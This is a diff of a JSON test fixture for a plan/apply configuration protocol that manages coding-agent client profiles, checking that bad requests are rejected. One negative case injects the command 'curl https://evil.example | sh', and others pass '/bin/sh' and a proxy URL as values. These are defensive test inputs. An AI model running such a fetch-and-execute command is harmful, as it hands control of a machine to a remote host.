@@ -5,12 +5,76 @@
     "schema": 1,
     "at": 995,
     "revision": "00112233445566ff",
-    "defaults": {"enabled": true, "min_bytes": 2048, "stats": "queue"},
+    "defaults": {
+      "enabled": true,
+      "min_bytes": 2048,
+      "stats": "queue"
+    },
     "profiles": [
-      {"kind": "codex", "id": "0123456789abcdef", "revision": "1111111111111111", "routing": "routed", "mcp": "registered", "hooks": "registered", "plugin": "unsupported", "optimization": "enabled", "effective": {"adapter": "provider", "state": "configured"}, "owned": true, "overrides": 0, "conflicts": [], "incomplete": []},
-      {"kind": "claude-desktop-chat", "id": "2222222222222222", "revision": "2222222222222223", "routing": "unsupported", "mcp": "absent", "hooks": "unsupported", "plugin": "unsupported", "optimization": "enabled", "effective": {"adapter": null, "state": "unsupported"}, "owned": false, "overrides": null, "conflicts": [], "incomplete": []},
-      {"kind": "claude-code", "id": "3333333333333333", "revision": "3333333333333334", "routing": "direct", "mcp": "registered", "hooks": "registered", "plugin": "unsupported", "optimization": "enabled", "effective": {"adapter": "hook", "state": "configured"}, "owned": true, "overrides": 2, "conflicts": [], "incomplete": []},
-      {"kind": "codex", "id": "5555555555555555", "revision": "5555555555555556", "routing": "bypassed", "mcp": "unknown", "hooks": "unknown", "plugin": "unsupported", "optimization": "enabled", "effective": {"adapter": "provider", "state": "bypassed"}, "owned": false, "overrides": null, "conflicts": ["foreign_provider"], "incomplete": ["unreadable_config"]}
+      {
+        "kind": "codex",
+        "id": "0123456789abcdef",
+        "revision": "1111111111111111",
+        "hooks": "absent",
+        "plugin": "unsupported",
+        "effective": {
+          "adapter": "hook",
+          "state": "missing"
+        },
+        "owned": true,
+        "overrides": 0,
+        "conflicts": [],
+        "incomplete": []
+      },
+      {
+        "kind": "hermes",
+        "id": "2222222222222222",
+        "revision": "2222222222222223",
+        "hooks": "unsupported",
+        "plugin": "absent",
+        "effective": {
+          "adapter": "plugin",
+          "state": "missing"
+        },
+        "owned": false,
+        "overrides": null,
+        "conflicts": [],
+        "incomplete": []
+      },
+      {
+        "kind": "claude-code",
+        "id": "3333333333333333",
+        "revision": "3333333333333334",
+        "hooks": "registered",
+        "plugin": "unsupported",
+        "effective": {
+          "adapter": "hook",
+          "state": "configured"
+        },
+        "owned": true,
+        "overrides": 2,
+        "conflicts": [],
+        "incomplete": []
+      },
+      {
+        "kind": "codex",
+        "id": "5555555555555555",
+        "revision": "5555555555555556",
+        "hooks": "unknown",
+        "plugin": "unsupported",
+        "effective": {
+          "adapter": "provider",
+          "state": "bypassed"
+        },
+        "owned": false,
+        "overrides": null,
+        "conflicts": [
+          "foreign_provider"
+        ],
+        "incomplete": [
+          "unreadable_config"
+        ]
+      }
     ]
   },
   "host": {
@@ -18,119 +82,786 @@
     "generation": 3,
     "now": 1000,
     "durable": true,
-    "grant": {"capability": "agentq.configure", "actor": "actor-1", "workspace": "ws-1", "installation": "inst-1", "generation": 3, "profiles": ["0123456789abcdef", "2222222222222222", "3333333333333333", "5555555555555555", "6666666666666666"], "expires_at": 5000},
+    "grant": {
+      "capability": "agentq.configure",
+      "actor": "actor-1",
+      "workspace": "ws-1",
+      "installation": "inst-1",
+      "generation": 3,
+      "profiles": [
+        "0123456789abcdef",
+        "2222222222222222",
+        "3333333333333333",
+        "5555555555555555",
+        "6666666666666666"
+      ],
+      "expires_at": 5000
+    },
     "outstanding": null,
     "seen": null
   },
   "requests": {
     "plan": {
-      "schema": 1, "operation": "a0000000000000000000000000000001", "kind": "plan", "actor": "actor-1", "workspace": "ws-1", "installation": "inst-1", "generation": 3, "issued_at": 990, "expires_at": 1290,
-      "changes": [{"profile": "0123456789abcdef", "field": "routing", "value": "direct"}, {"profile": "2222222222222222", "field": "mcp", "value": "registered"}, {"profile": "0123456789abcdef", "field": "optimization", "value": "disabled"}]
+      "schema": 1,
+      "operation": "a0000000000000000000000000000001",
+      "kind": "plan",
+      "actor": "actor-1",
+      "workspace": "ws-1",
+      "installation": "inst-1",
+      "generation": 3,
+      "issued_at": 990,
+      "expires_at": 1290,
+      "changes": [
+        {
+          "profile": "0123456789abcdef",
+          "field": "hooks",
+          "value": "registered"
+        },
+        {
+          "profile": "2222222222222222",
+          "field": "plugin",
+          "value": "enabled"
+        }
+      ]
     },
     "apply": {
-      "schema": 1, "operation": "b0000000000000000000000000000002", "kind": "apply", "actor": "actor-1", "workspace": "ws-1", "installation": "inst-1", "generation": 3, "issued_at": 990, "expires_at": 1290,
-      "changes": [{"profile": "0123456789abcdef", "field": "routing", "value": "direct"}, {"profile": "2222222222222222", "field": "mcp", "value": "registered"}, {"profile": "0123456789abcdef", "field": "optimization", "value": "disabled"}],
-      "plan": {"revision": "00112233445566ff", "digest": "9d029e2b923a7a5b63e1b3e2c306898c454f27df8026fd6e061b3421b274d937"}
+      "schema": 1,
+      "operation": "b0000000000000000000000000000002",
+      "kind": "apply",
+      "actor": "actor-1",
+      "workspace": "ws-1",
+      "installation": "inst-1",
+      "generation": 3,
+      "issued_at": 990,
+      "expires_at": 1290,
+      "changes": [
+        {
+          "profile": "0123456789abcdef",
+          "field": "hooks",
+          "value": "registered"
+        },
+        {
+          "profile": "2222222222222222",
+          "field": "plugin",
+          "value": "enabled"
+        }
+      ],
+      "plan": {
+        "revision": "00112233445566ff",
+        "digest": "896beeb21ba8c2f04e75564273512f54af4dcc748a42a45276d3de2ccbc0c1ce"
+      }
     }
   },
   "cases": [
-    {"name": "plan exposes old/new values, aliases, revisions and reload", "request": "plan",
-      "expect": {"kind": "plan", "operation": "a0000000000000000000000000000001", "installation": "inst-1", "generation": 3, "revision": "00112233445566ff", "expires_at": 1290, "writable": true, "blocked": [], "digest": "9d029e2b923a7a5b63e1b3e2c306898c454f27df8026fd6e061b3421b274d937",
+    {
+      "name": "plan exposes old/new values, aliases, revisions and reload",
+      "request": "plan",
+      "expect": {
+        "kind": "plan",
+        "operation": "a0000000000000000000000000000001",
+        "installation": "inst-1",
+        "generation": 3,
+        "revision": "00112233445566ff",
+        "expires_at": 1290,
+        "writable": true,
+        "blocked": []
+      }
+    },
+    {
+      "name": "plan blocks on foreign provider and incomplete config",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "5555555555555555",
+            "field": "hooks",
+            "value": "registered"
+          }
+        ]
+      },
+      "expect": {
+        "writable": false,
+        "blocked": [
+          "foreign_provider",
+          "unreadable_config"
+        ]
+      }
+    },
+    {
+      "name": "native-file writes remain blocked on a project override",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "3333333333333333",
+            "field": "hooks",
+            "value": "registered"
+          }
+        ]
+      },
+      "expect": {
+        "writable": false,
+        "blocked": [
+          "project_override"
+        ]
+      }
+    },
+    {
+      "name": "plan blocks a field the client does not support",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "2222222222222222",
+            "field": "hooks",
+            "value": "registered"
+          }
+        ]
+      },
+      "expect": {
+        "writable": false,
+        "blocked": [
+          "unsupported_client"
+        ]
+      }
+    },
+    {
+      "name": "plan blocks a profile the host no longer has",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "6666666666666666",
+            "field": "hooks",
+            "value": "registered"
+          }
+        ]
+      },
+      "expect": {
+        "writable": false,
+        "blocked": [
+          "unknown_profile"
+        ]
+      }
+    },
+    {
+      "name": "plan needs no durable storage and ignores an outstanding mutation",
+      "request": "plan",
+      "host": {
+        "durable": false,
+        "outstanding": "c0000000000000000000000000000003"
+      },
+      "expect": {
+        "kind": "plan",
+        "writable": true
+      }
+    },
+    {
+      "name": "apply of the confirmed plan is durably accepted",
+      "request": "apply",
+      "expect": {
+        "kind": "result",
+        "outcome": "accepted",
+        "reason": null,
+        "operation": "b0000000000000000000000000000002",
+        "plan": "896beeb21ba8c2f04e75564273512f54af4dcc748a42a45276d3de2ccbc0c1ce"
+      }
+    },
+    {
+      "name": "apply after an out-of-band edit is stale",
+      "request": "apply",
+      "patch": {
+        "plan": {
+          "revision": "00112233445566fe"
+        }
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "stale_revision"
+      }
+    },
+    {
+      "name": "apply of an edited plan is rejected",
+      "request": "apply",
+      "patch": {
+        "changes": [
+          {
+            "profile": "0123456789abcdef",
+            "field": "hooks",
+            "value": "registered"
+          }
+        ]
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "plan_changed"
+      }
+    },
+    {
+      "name": "apply of a blocked plan is rejected",
+      "request": "apply",
+      "patch": {
+        "changes": [
+          {
+            "profile": "3333333333333333",
+            "field": "hooks",
+            "value": "registered"
+          }
+        ]
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "blocked"
+      }
+    },
+    {
+      "name": "configure cannot reconnect a disabled integration",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "0123456789abcdef",
+            "field": "hooks",
+            "value": "registered"
+          }
+        ]
+      },
+      "configuration": {
         "profiles": [
-          {"id": "0123456789abcdef", "kind": "codex", "aliases": ["codex-cli", "codex-desktop"], "revision": "1111111111111111", "changes": [{"field": "routing", "old": "routed", "new": "direct"}, {"field": "optimization", "old": "enabled", "new": "disabled"}], "conflicts": [], "reload": true},
-          {"id": "2222222222222222", "kind": "claude-desktop-chat", "aliases": ["claude-desktop-chat"], "revision": "2222222222222223", "changes": [{"field": "mcp", "old": "absent", "new": "registered"}], "conflicts": [], "reload": true}
-        ]}},
-    {"name": "optimization preference alone needs no client reload", "request": "plan",
-      "patch": {"changes": [{"profile": "0123456789abcdef", "field": "optimization", "value": "disabled"}]},
-      "expect": {"writable": true, "profiles": [{"changes": [{"field": "optimization", "old": "enabled", "new": "disabled"}], "reload": false}]}},
-    {"name": "plan blocks on foreign provider and incomplete config", "request": "plan",
-      "patch": {"changes": [{"profile": "5555555555555555", "field": "routing", "value": "routed"}]},
-      "expect": {"writable": false, "blocked": ["foreign_provider", "unreadable_config"], "profiles": [{"changes": [{"field": "routing", "old": "bypassed", "new": "routed"}]}]}},
-    {"name": "optimization preference does not edit a project override", "request": "plan",
-      "patch": {"changes": [{"profile": "3333333333333333", "field": "optimization", "value": "disabled"}]},
-      "expect": {"writable": true, "blocked": []}},
-    {"name": "native-file writes remain blocked on a project override", "request": "plan",
-      "patch": {"changes": [{"profile": "3333333333333333", "field": "hooks", "value": "registered"}]},
-      "expect": {"writable": false, "blocked": ["project_override"]}},
-    {"name": "plan blocks a value the host has no writer for", "request": "plan",
-      "patch": {"changes": [{"profile": "3333333333333333", "field": "routing", "value": "routed"}]},
-      "expect": {"writable": false, "blocked": ["project_override", "unsupported_client"]}},
-    {"name": "plan blocks a field the client does not support", "request": "plan",
-      "patch": {"changes": [{"profile": "2222222222222222", "field": "routing", "value": "routed"}]},
-      "expect": {"writable": false, "blocked": ["unsupported_client"], "profiles": [{"changes": [{"field": "routing", "old": "unsupported", "new": "routed"}]}]}},
-    {"name": "plan blocks a profile the host no longer has", "request": "plan",
-      "patch": {"changes": [{"profile": "6666666666666666", "field": "mcp", "value": "registered"}]},
-      "expect": {"writable": false, "blocked": ["unknown_profile"], "profiles": [{"id": "6666666666666666", "kind": null, "revision": null}]}},
-    {"name": "plan needs no durable storage and ignores an outstanding mutation", "request": "plan",
-      "host": {"durable": false, "outstanding": "c0000000000000000000000000000003"},
-      "expect": {"kind": "plan", "writable": true}},
-    {"name": "apply of the confirmed plan is durably accepted", "request": "apply",
-      "expect": {"kind": "result", "outcome": "accepted", "reason": null, "operation": "b0000000000000000000000000000002", "plan": "9d029e2b923a7a5b63e1b3e2c306898c454f27df8026fd6e061b3421b274d937"}},
-    {"name": "apply after an out-of-band edit is stale", "request": "apply",
-      "patch": {"plan": {"revision": "00112233445566fe"}},
-      "expect": {"outcome": "rejected", "reason": "stale_revision"}},
-    {"name": "apply of an edited plan is rejected", "request": "apply",
-      "patch": {"changes": [{"profile": "0123456789abcdef", "field": "routing", "value": "direct"}]},
-      "expect": {"outcome": "rejected", "reason": "plan_changed"}},
-    {"name": "apply of a blocked plan is rejected", "request": "apply",
-      "patch": {"changes": [{"profile": "3333333333333333", "field": "hooks", "value": "registered"}]},
-      "expect": {"outcome": "rejected", "reason": "blocked"}},
-    {"name": "configure cannot reconnect a disabled integration", "request": "plan",
-      "patch": {"changes": [{"profile": "0123456789abcdef", "field": "mcp", "value": "registered"}]},
-      "configuration": {"profiles": [{"kind": "codex", "id": "0123456789abcdef", "revision": "1111111111111111", "mcp": "absent", "integration": {"desired": "disabled"}, "conflicts": [], "incomplete": [], "overrides": 0}]},
-      "expect": {"writable": false, "blocked": ["integration_disabled"]}},
-    {"name": "apply refuses when durable control storage is unavailable", "request": "apply", "host": {"durable": false},
-      "expect": {"outcome": "rejected", "reason": "storage_unavailable"}},
-    {"name": "one outstanding mutation per installation", "request": "apply", "host": {"outstanding": "c0000000000000000000000000000003"},
-      "expect": {"outcome": "rejected", "reason": "busy"}},
-    {"name": "wrong actor", "request": "plan", "patch": {"actor": "actor-2"}, "expect": {"outcome": "rejected", "reason": "wrong_actor"}},
-    {"name": "wrong workspace", "request": "plan", "patch": {"workspace": "ws-2"}, "expect": {"outcome": "rejected", "reason": "wrong_workspace"}},
-    {"name": "wrong installation", "request": "plan", "patch": {"installation": "inst-2"}, "expect": {"outcome": "rejected", "reason": "wrong_installation"}},
-    {"name": "grant bound to another installation", "request": "plan", "host": {"grant": {"installation": "inst-2"}}, "expect": {"outcome": "rejected", "reason": "wrong_installation"}},
-    {"name": "profile outside the granted scope", "request": "plan",
-      "patch": {"changes": [{"profile": "7777777777777777", "field": "mcp", "value": "registered"}]},
-      "expect": {"outcome": "rejected", "reason": "profile_out_of_scope"}},
-    {"name": "request from an older generation", "request": "plan", "patch": {"generation": 2}, "expect": {"outcome": "rejected", "reason": "stale_generation"}},
-    {"name": "grant of an older generation after re-enrollment", "request": "apply", "host": {"generation": 4}, "patch": {"generation": 4}, "expect": {"outcome": "rejected", "reason": "stale_generation"}},
-    {"name": "observation credential grants no configuration authority", "request": "plan", "host": {"grant": {"capability": "agentq.observe"}},
-      "expect": {"outcome": "rejected", "reason": "observation_only"}},
-    {"name": "revoked or unenrolled host", "request": "apply", "host": {"grant": null}, "expect": {"outcome": "rejected", "reason": "no_grant"}},
-    {"name": "expired grant", "request": "apply", "host": {"now": 5000, "grant": {"expires_at": 5000}}, "patch": {"issued_at": 4990, "expires_at": 5200},
-      "expect": {"outcome": "rejected", "reason": "grant_expired"}},
-    {"name": "operation expires five minutes after issue", "request": "apply", "host": {"now": 1290}, "expect": {"outcome": "rejected", "reason": "expired"}},
-    {"name": "offline operation delivered late never applies", "request": "apply", "host": {"now": 4000}, "expect": {"outcome": "rejected", "reason": "expired"}},
-    {"name": "expiry window over five minutes is invalid", "request": "plan", "patch": {"expires_at": 1291}, "expect": {"outcome": "rejected", "reason": "invalid_expiry"}},
-    {"name": "duplicate delivery returns the first result", "request": "apply",
-      "host": {"now": 9000, "seen": {"digest": "request", "result": {"schema": 1, "kind": "result", "operation": "b0000000000000000000000000000002", "outcome": "applied", "reason": null, "plan": "9d029e2b923a7a5b63e1b3e2c306898c454f27df8026fd6e061b3421b274d937", "profiles": [{"id": "0123456789abcdef", "state": "applied"}, {"id": "2222222222222222", "state": "applied"}]}}},
-      "expect": {"outcome": "applied", "profiles": [{"id": "0123456789abcdef", "state": "applied"}, {"id": "2222222222222222", "state": "applied"}]}},
-    {"name": "duplicate delivery with reordered keys returns the first result", "request": "apply", "reorder": true,
-      "host": {"seen": {"digest": "request", "result": {"schema": 1, "kind": "result", "operation": "b0000000000000000000000000000002", "outcome": "unknown", "reason": "interrupted", "plan": null, "profiles": []}}},
-      "expect": {"outcome": "unknown", "reason": "interrupted"}},
-    {"name": "changed payload under the same operation ID", "request": "apply",
-      "host": {"seen": {"digest": "0000000000000000000000000000000000000000000000000000000000000000", "result": {"schema": 1, "kind": "result", "operation": "b0000000000000000000000000000002", "outcome": "accepted", "reason": null, "plan": null, "profiles": []}}},
-      "expect": {"outcome": "rejected", "reason": "payload_mismatch"}},
-    {"name": "operation ID must be 32 lowercase hex", "request": "plan", "patch": {"operation": "op-1"}, "expect": {"outcome": "rejected", "reason": "invalid", "operation": null}},
-    {"name": "arbitrary path as a value", "request": "plan", "patch": {"changes": [{"profile": "0123456789abcdef", "field": "mcp", "value": "/bin/sh"}]},
-      "expect": {"outcome": "rejected", "reason": "unsupported_value"}},
-    {"name": "provider selection", "request": "plan", "patch": {"changes": [{"profile": "0123456789abcdef", "field": "provider", "value": "openai"}]},
-      "expect": {"outcome": "rejected", "reason": "unsupported_field"}},
-    {"name": "file target", "request": "plan", "patch": {"changes": [{"profile": "0123456789abcdef", "field": "routing", "value": "direct", "file": "/Users/alice/.codex/config.toml"}]},
-      "expect": {"outcome": "rejected", "reason": "unknown_field"}},
-    {"name": "shell command", "request": "apply", "patch": {"command": "curl https://evil.example | sh"}, "expect": {"outcome": "rejected", "reason": "unknown_field"}},
-    {"name": "engine pin", "request": "plan", "patch": {"engine_pin": {"headroom": "9.9.9"}}, "expect": {"outcome": "rejected", "reason": "unknown_field"}},
-    {"name": "provider URL", "request": "plan", "patch": {"changes": [{"profile": "0123456789abcdef", "field": "routing", "value": "https://proxy.example/v1"}]},
-      "expect": {"outcome": "rejected", "reason": "unsupported_value"}},
-    {"name": "installation given as a path", "request": "plan", "patch": {"installation": "/Users/alice"}, "expect": {"outcome": "rejected", "reason": "invalid"}},
-    {"name": "plan field on a plan request", "request": "plan", "patch": {"plan": {"revision": "00112233445566ff", "digest": "9d029e2b923a7a5b63e1b3e2c306898c454f27df8026fd6e061b3421b274d937"}}, "expect": {"outcome": "rejected", "reason": "unknown_field"}},
-    {"name": "payload over 16 KiB", "request": "plan", "pad": 16384, "expect": {"outcome": "rejected", "reason": "payload_too_large", "operation": null}}
+          {
+            "kind": "codex",
+            "id": "0123456789abcdef",
+            "revision": "1111111111111111",
+            "mcp": "absent",
+            "integration": {
+              "desired": "disabled"
+            },
+            "conflicts": [],
+            "incomplete": [],
+            "overrides": 0
+          }
+        ]
+      },
+      "expect": {
+        "writable": false,
+        "blocked": [
+          "integration_disabled"
+        ]
+      }
+    },
+    {
+      "name": "apply refuses when durable control storage is unavailable",
+      "request": "apply",
+      "host": {
+        "durable": false
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "storage_unavailable"
+      }
+    },
+    {
+      "name": "one outstanding mutation per installation",
+      "request": "apply",
+      "host": {
+        "outstanding": "c0000000000000000000000000000003"
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "busy"
+      }
+    },
+    {
+      "name": "wrong actor",
+      "request": "plan",
+      "patch": {
+        "actor": "actor-2"
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "wrong_actor"
+      }
+    },
+    {
+      "name": "wrong workspace",
+      "request": "plan",
+      "patch": {
+        "workspace": "ws-2"
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "wrong_workspace"
+      }
+    },
+    {
+      "name": "wrong installation",
+      "request": "plan",
+      "patch": {
+        "installation": "inst-2"
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "wrong_installation"
+      }
+    },
+    {
+      "name": "grant bound to another installation",
+      "request": "plan",
+      "host": {
+        "grant": {
+          "installation": "inst-2"
+        }
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "wrong_installation"
+      }
+    },
+    {
+      "name": "profile outside the granted scope",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "7777777777777777",
+            "field": "hooks",
+            "value": "registered"
+          }
+        ]
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "profile_out_of_scope"
+      }
+    },
+    {
+      "name": "request from an older generation",
+      "request": "plan",
+      "patch": {
+        "generation": 2
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "stale_generation"
+      }
+    },
+    {
+      "name": "grant of an older generation after re-enrollment",
+      "request": "apply",
+      "host": {
+        "generation": 4
+      },
+      "patch": {
+        "generation": 4
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "stale_generation"
+      }
+    },
+    {
+      "name": "observation credential grants no configuration authority",
+      "request": "plan",
+      "host": {
+        "grant": {
+          "capability": "agentq.observe"
+        }
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "observation_only"
+      }
+    },
+    {
+      "name": "revoked or unenrolled host",
+      "request": "apply",
+      "host": {
+        "grant": null
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "no_grant"
+      }
+    },
+    {
+      "name": "expired grant",
+      "request": "apply",
+      "host": {
+        "now": 5000,
+        "grant": {
+          "expires_at": 5000
+        }
+      },
+      "patch": {
+        "issued_at": 4990,
+        "expires_at": 5200
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "grant_expired"
+      }
+    },
+    {
+      "name": "operation expires five minutes after issue",
+      "request": "apply",
+      "host": {
+        "now": 1290
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "expired"
+      }
+    },
+    {
+      "name": "offline operation delivered late never applies",
+      "request": "apply",
+      "host": {
+        "now": 4000
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "expired"
+      }
+    },
+    {
+      "name": "expiry window over five minutes is invalid",
+      "request": "plan",
+      "patch": {
+        "expires_at": 1291
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "invalid_expiry"
+      }
+    },
+    {
+      "name": "duplicate delivery returns the first result",
+      "request": "apply",
+      "host": {
+        "now": 9000,
+        "seen": {
+          "digest": "request",
+          "result": {
+            "schema": 1,
+            "kind": "result",
+            "operation": "b0000000000000000000000000000002",
+            "outcome": "applied",
+            "reason": null,
+            "plan": "896beeb21ba8c2f04e75564273512f54af4dcc748a42a45276d3de2ccbc0c1ce",
+            "profiles": [
+              {
+                "id": "0123456789abcdef",
+                "state": "applied"
+              },
+              {
+                "id": "2222222222222222",
+                "state": "applied"
+              }
+            ]
+          }
+        }
+      },
+      "expect": {
+        "outcome": "applied"
+      }
+    },
+    {
+      "name": "duplicate delivery with reordered keys returns the first result",
+      "request": "apply",
+      "reorder": true,
+      "host": {
+        "seen": {
+          "digest": "request",
+          "result": {
+            "schema": 1,
+            "kind": "result",
+            "operation": "b0000000000000000000000000000002",
+            "outcome": "unknown",
+            "reason": "interrupted",
+            "plan": null,
+            "profiles": []
+          }
+        }
+      },
+      "expect": {
+        "outcome": "unknown",
+        "reason": "interrupted"
+      }
+    },
+    {
+      "name": "changed payload under the same operation ID",
+      "request": "apply",
+      "host": {
+        "seen": {
+          "digest": "0000000000000000000000000000000000000000000000000000000000000000",
+          "result": {
+            "schema": 1,
+            "kind": "result",
+            "operation": "b0000000000000000000000000000002",
+            "outcome": "accepted",
+            "reason": null,
+            "plan": null,
+            "profiles": []
+          }
+        }
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "payload_mismatch"
+      }
+    },
+    {
+      "name": "operation ID must be 32 lowercase hex",
+      "request": "plan",
+      "patch": {
+        "operation": "op-1"
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "invalid",
+        "operation": null
+      }
+    },
+    {
+      "name": "arbitrary path as a value",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "0123456789abcdef",
+            "field": "hooks",
+            "value": "/bin/sh"
+          }
+        ]
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "unsupported_value"
+      }
+    },
+    {
+      "name": "provider selection",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "0123456789abcdef",
+            "field": "provider",
+            "value": "openai"
+          }
+        ]
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "unsupported_field"
+      }
+    },
+    {
+      "name": "file target",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "0123456789abcdef",
+            "field": "hooks",
+            "value": "registered",
+            "file": "/Users/alice/.codex/config.toml"
+          }
+        ]
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "unknown_field"
+      }
+    },
+    {
+      "name": "shell command",
+      "request": "apply",
+      "patch": {
+        "command": "curl https://evil.example | sh"
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "unknown_field"
+      }
+    },
+    {
+      "name": "engine pin",
+      "request": "plan",
+      "patch": {
+        "engine_pin": {
+          "headroom": "9.9.9"
+        }
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "unknown_field"
+      }
+    },
+    {
+      "name": "provider URL",
+      "request": "plan",
+      "patch": {
+        "changes": [
+          {
+            "profile": "0123456789abcdef",
+            "field": "hooks",
+            "value": "https://proxy.example/v1"
+          }
+        ]
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "unsupported_value"
+      }
+    },
+    {
+      "name": "installation given as a path",
+      "request": "plan",
+      "patch": {
+        "installation": "/Users/alice"
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "invalid"
+      }
+    },
+    {
+      "name": "plan field on a plan request",
+      "request": "plan",
+      "patch": {
+        "plan": {
+          "revision": "00112233445566ff",
+          "digest": "896beeb21ba8c2f04e75564273512f54af4dcc748a42a45276d3de2ccbc0c1ce"
+        }
+      },
+      "expect": {
+        "outcome": "rejected",
+        "reason": "unknown_field"
+      }
+    },
+    {
+      "name": "payload over 16 KiB",
+      "request": "plan",
+      "pad": 16384,
+      "expect": {
+        "outcome": "rejected",
+        "reason": "payload_too_large",
+        "operation": null
+      }
+    }
   ],
   "results": [
-    {"name": "applied: configured by readback, never verified", "valid": true, "result": {"schema": 1, "kind": "result", "operation": "b0000000000000000000000000000002", "outcome": "applied", "reason": null, "plan": "9d029e2b923a7a5b63e1b3e2c306898c454f27df8026fd6e061b3421b274d937", "profiles": [{"id": "0123456789abcdef", "state": "applied"}]}},
-    {"name": "partial: one profile written, one restored", "valid": true, "result": {"schema": 1, "kind": "result", "operation": "b0000000000000000000000000000002", "outcome": "partial", "reason": "write_failed", "plan": "9d029e2b923a7a5b63e1b3e2c306898c454f27df8026fd6e061b3421b274d937", "profiles": [{"id": "0123456789abcdef", "state": "applied"}, {"id": "2222222222222222", "state": "restored"}]}},
-    {"name": "unknown: interrupted, reconcile before any retry", "valid": true, "result": {"schema": 1, "kind": "result", "operation": "b0000000000000000000000000000002", "outcome": "unknown", "reason": "interrupted", "plan": "9d029e2b923a7a5b63e1b3e2c306898c454f27df8026fd6e061b3421b274d937", "profiles": [{"id": "0123456789abcdef", "state": "unknown"}]}},
-    {"name": "verified is not a result outcome", "valid": false, "result": {"schema": 1, "kind": "result", "operation": null, "outcome": "verified", "reason": null, "plan": null, "profiles": []}},
-    {"name": "unknown needs a reason", "valid": false, "result": {"schema": 1, "kind": "result", "operation": null, "outcome": "unknown", "reason": null, "plan": null, "profiles": []}},
-    {"name": "free text never crosses", "valid": false, "result": {"schema": 1, "kind": "result", "operation": null, "outcome": "rejected", "reason": "EACCES /Users/alice/.codex/config.toml", "plan": null, "profiles": []}},
-    {"name": "config contents never cross", "valid": false, "result": {"schema": 1, "kind": "result", "operation": null, "outcome": "applied", "reason": null, "plan": null, "profiles": [], "config": "model_provider = \"x\""}}
+    {
+      "name": "applied: configured by readback, never verified",
+      "valid": true,
+      "result": {
+        "schema": 1,
+        "kind": "result",
+        "operation": "b0000000000000000000000000000002",
+        "outcome": "applied",
+        "reason": null,
+        "plan": "896beeb21ba8c2f04e75564273512f54af4dcc748a42a45276d3de2ccbc0c1ce",
+        "profiles": [
+          {
+            "id": "0123456789abcdef",
+            "state": "applied"
+          }
+        ]
+      }
+    },
+    {
+      "name": "partial: one profile written, one restored",
+      "valid": true,
+      "result": {
+        "schema": 1,
+        "kind": "result",
+        "operation": "b0000000000000000000000000000002",
+        "outcome": "partial",
+        "reason": "write_failed",
+        "plan": "896beeb21ba8c2f04e75564273512f54af4dcc748a42a45276d3de2ccbc0c1ce",
+        "profiles": [
+          {
+            "id": "0123456789abcdef",
+            "state": "applied"
+          },
+          {
+            "id": "2222222222222222",
+            "state": "restored"
+          }
+        ]
+      }
+    },
+    {
+      "name": "unknown: interrupted, reconcile before any retry",
+      "valid": true,
+      "result": {
+        "schema": 1,
+        "kind": "result",
+        "operation": "b0000000000000000000000000000002",
+        "outcome": "unknown",
+        "reason": "interrupted",
+        "plan": "896beeb21ba8c2f04e75564273512f54af4dcc748a42a45276d3de2ccbc0c1ce",
+        "profiles": [
+          {
+            "id": "0123456789abcdef",
+            "state": "unknown"
+          }
+        ]
+      }
+    },
+    {
+      "name": "verified is not a result outcome",
+      "valid": false,
+      "result": {
+        "schema": 1,
+        "kind": "result",
+        "operation": null,
+        "outcome": "verified",
+        "reason": null,
+        "plan": null,
+        "profiles": []
+      }
+    },
+    {
+      "name": "unknown needs a reason",
+      "valid": false,
+      "result": {
+        "schema": 1,
+        "kind": "result",
+        "operation": null,
+        "outcome": "unknown",
+        "reason": null,
+        "plan": null,
+        "profiles": []
+      }
+    },
+    {
+      "name": "free text never crosses",
+      "valid": false,
+      "result": {
+        "schema": 1,
+        "kind": "result",
+        "operation": null,
+        "outcome": "rejected",
+        "reason": "EACCES /Users/alice/.codex/config.toml",
+        "plan": null,
+        "profiles": []
+      }
+    },
+    {
+      "name": "config contents never cross",
+      "valid": false,
+      "result": {
+        "schema": 1,
+        "kind": "result",
+        "operation": null,
+        "outcome": "applied",
+        "reason": null,
+        "plan": null,
+        "profiles": [],
+        "config": "model_provider = \"x\""
+      }
+    }
   ]
 }
